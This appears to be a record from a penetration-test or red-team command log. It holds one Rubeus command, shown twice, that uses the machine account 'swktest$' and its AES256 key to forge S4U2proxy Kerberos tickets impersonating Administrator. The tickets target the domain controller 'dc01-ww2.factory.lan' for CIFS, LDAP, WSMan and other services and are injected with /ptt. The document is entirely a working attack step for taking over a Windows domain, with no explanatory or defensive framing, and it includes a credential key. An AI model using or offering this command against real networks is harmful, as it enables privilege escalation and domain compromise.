---
id: 0c8c8fe7-d0d4-41cc-91dc-4e820b9d27d3
name: S4U2proxy request for service 'cifs/dc01-ww2.factory.lan'
type: command
executor: bash
data: .\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347
  /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
output: null
created_at: '2023-04-06T03:56:07.772114+00:00'
updated_at: '2023-04-06T03:56:07.815485+00:00'
---

# S4U2proxy request for service 'cifs/dc01-ww2.factory.lan'

```bash
.\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
```
